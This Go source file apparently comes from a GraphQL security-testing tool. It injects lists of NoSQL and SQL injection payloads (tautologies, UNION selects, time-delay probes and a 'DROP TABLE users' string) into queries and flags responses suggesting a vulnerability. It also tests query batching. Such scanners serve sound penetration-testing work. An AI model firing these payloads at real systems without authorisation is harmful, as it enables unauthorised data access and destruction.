package main

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/fatih/color"
)

type InjectionTester struct {
	config *Config
	client *http.Client
}

func NewInjectionTester(config *Config) *InjectionTester {
	return &InjectionTester{
		config: config,
		client: createHTTPClient(config),
	}
}

var noSQLiPayloads = []string{
	`{"$ne": null}`,
	`{"$gt": ""}`,
	`{"$regex": "^a"}`,
	`{"$ne": "1"}`,
	`{"$gt": 1}`,
	`{"$where": "sleep(1000)"}`,
	`1`,
	`true`,
	`false`,
	`null`,
}

var postgreSQLPayloads = []string{
	`' OR '1'='1`,
	`' OR 1=1--`,
	`'; DROP TABLE users--`,
	`1' OR '1'='1' /*`,
	`1 OR 1=1`,
	`1' OR '1'='1'--`,
	`admin'--`,
	`1; WAITFOR DELAY '0:0:5'--`,
	`1 AND 1=1`,
	`1 AND 1=2`,
}

var mySQLPayloads = []string{
	`' OR '1'='1`,
	`' OR 1=1--`,
	`1' OR '1'='1' /*`,
	`admin'--`,
	`1 OR 1=1`,
	`1' OR '1'='1'--`,
	`1; SELECT SLEEP(5)`,
	`1 AND 1=1`,
	`1 AND 1=2`,
	`1 UNION SELECT 1,2,3--`,
}

var mssqlPayloads = []string{
	`' OR '1'='1`,
	`' OR 1=1--`,
	`1' OR '1'='1' /*`,
	`admin'--`,
	`1 OR 1=1`,
	`1'; WAITFOR DELAY '0:0:5'--`,
	`1 AND 1=1`,
	`1 AND 1=2`,
	`1; SELECT * FROM users--`,
	`1 UNION SELECT 1,2,3--`,
}

func (it *InjectionTester) TestNoSQLi(baseQuery string) {
	color.Yellow("Testing NoSQL injection...")
	it.runInjectionTest(baseQuery, noSQLiPayloads, "NoSQLi")
}

func (it *InjectionTester) TestPostgreSQL(baseQuery string) {
	color.Yellow("Testing PostgreSQL injection...")
	it.runInjectionTest(baseQuery, postgreSQLPayloads, "PostgreSQL")
}

func (it *InjectionTester) TestMySQL(baseQuery string) {
	color.Yellow("Testing MySQL injection...")
	it.runInjectionTest(baseQuery, mySQLPayloads, "MySQL")
}

func (it *InjectionTester) TestMSSQL(baseQuery string) {
	color.Yellow("Testing MSSQL injection...")
	it.runInjectionTest(baseQuery, mssqlPayloads, "MSSQL")
}

func (it *InjectionTester) runInjectionTest(baseQuery string, payloads []string, typeName string) {
	fmt.Println(strings.Repeat("=", 80))

	baseLength := -1
	var baseDuration time.Duration

	for i, payload := range payloads {
		query := strings.ReplaceAll(baseQuery, TokenBlind, payload)

		startTime := time.Now()
		resp, err := executeQuery(it.config, it.client, query, nil)
		duration := time.Since(startTime)

		if i == 0 && err == nil && resp != nil {
			baseLength = len(resp.Data)
			baseDuration = duration
		}

		status := "  "
		notes := ""

		if err != nil {
			status = "!!"
			notes = fmt.Sprintf("Error: %v", err)
		} else if resp != nil {
			dataLen := len(resp.Data)
			lengthDiff := dataLen - baseLength
			timeDiff := duration - baseDuration

			if lengthDiff > 50 || lengthDiff < -50 {
				status = "++"
				notes = fmt.Sprintf("Length diff: %+d", lengthDiff)
			}

			if duration > 5*time.Second {
				status = "++"
				notes = fmt.Sprintf("%s Time delay: %v", notes, duration)
			}

			if resp.Errors != nil && len(resp.Errors) > 0 {
				for _, e := range resp.Errors {
					if msg, ok := e["message"].(string); ok {
						if strings.Contains(strings.ToLower(msg), "syntax") ||
							strings.Contains(strings.ToLower(msg), "error") ||
							strings.Contains(strings.ToLower(msg), "exception") {
							status = "!!"
							notes = fmt.Sprintf("%s Possible error leak: %s", notes, msg)
						}
					}
				}
			}
		}

		if status == "++" || status == "!!" {
			color.Red("[%s] Payload: %s", status, payload)
			if notes != "" {
				color.Yellow("    %s", notes)
			}
		} else if i < 5 {
			fmt.Printf("[%s] Payload: %s\n", status, payload)
		}
	}

	fmt.Println()
}

func (it *InjectionTester) TestBatching(baseQuery string, batchSize int) {
	color.Yellow("Testing query batching with batch size: %d", batchSize)

	queries := make([]string, batchSize)
	for i := 0; i < batchSize; i++ {
		queries[i] = baseQuery
	}

	batchQuery := strings.Join(queries, "\n")

	startTime := time.Now()
	resp, err := executeQuery(it.config, it.client, batchQuery, nil)
	duration := time.Since(startTime)

	if err != nil {
		color.Red("Batch execution error: %v", err)
		return
	}

	if resp != nil {
		color.Green("Batch response received in %v", duration)
		if resp.Errors != nil && len(resp.Errors) > 0 {
			color.Yellow("Batch returned %d errors", len(resp.Errors))
		}
		if resp.Data != nil {
			color.Green("Data length: %d bytes", len(resp.Data))
		}
	}
}
